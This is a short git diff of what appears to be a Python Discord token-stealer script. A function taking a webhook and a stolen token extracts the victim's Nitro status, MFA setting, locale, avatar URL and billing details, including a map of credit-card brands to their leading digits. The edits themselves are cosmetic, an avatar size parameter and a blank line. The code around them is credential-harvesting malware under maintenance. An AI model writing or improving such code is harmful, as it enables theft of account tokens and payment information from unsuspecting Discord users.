@@ -137,7 +137,7 @@ def printtk(webhook, token):
         nitro = "True" if userinfo.get("premium_type") else "False"
         mfa = "True" if userinfo.get("mfa_enabled") else "False"
         locale = userinfo.get('locale')
-        pfp = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar}" if avatar else "None"
+        pfp = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar}?size=1024" if avatar else "None"
         billing_fields = []
         cc_digits = {"visa": "4", "mastercard": "5", "amex": "3", "discover": "6"}
 
@@ -407,6 +407,7 @@ def main():
         
 
 main()
+
 
 
 
